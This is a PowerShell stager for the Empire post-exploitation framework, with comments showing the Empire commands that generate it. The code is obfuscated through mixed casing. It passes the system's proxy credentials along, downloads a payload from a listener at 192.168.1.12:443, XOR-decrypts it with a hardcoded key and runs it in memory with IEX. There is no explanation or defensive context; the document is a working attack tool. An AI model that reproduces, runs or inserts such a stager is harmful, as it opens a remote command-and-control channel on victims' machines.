# Stager to Empire listener 192.168.1.12:443
# Generate this stager using Empire, that way the encryption key will match
#(Emire) > Usestager launcher
#(Emire) > Set Listener test
#(Emire) > Set Base64 False
#(Emire) > Set OutFile /root/stager.ps1

[SysTeM.NET.SErVicePOinTMaNAGer]::EXPeCt100CoNtiNue = 0;$wC=NEw-ObjEct SYstEM.Net.WEbCLIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaderS.Add('User-Agent',$u);$Wc.PROXy=[SystEm.NEt.WebREQuest]::DefAuLtWEBPROxy;$WC.PRoxy.CreDEntIals=[SYsTEM.NeT.CREDENtiAlCAChe]::DefAulTNeTwORKCrEDentiALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[chAr[]]$b=([cHaR[]]($WC.DowNLOAdStrinG("http://192.168.1.12:443/index.asp")))|%{$_-bXor$K[$i++%$k.LEngTH]};IEX ($B-joIn'')
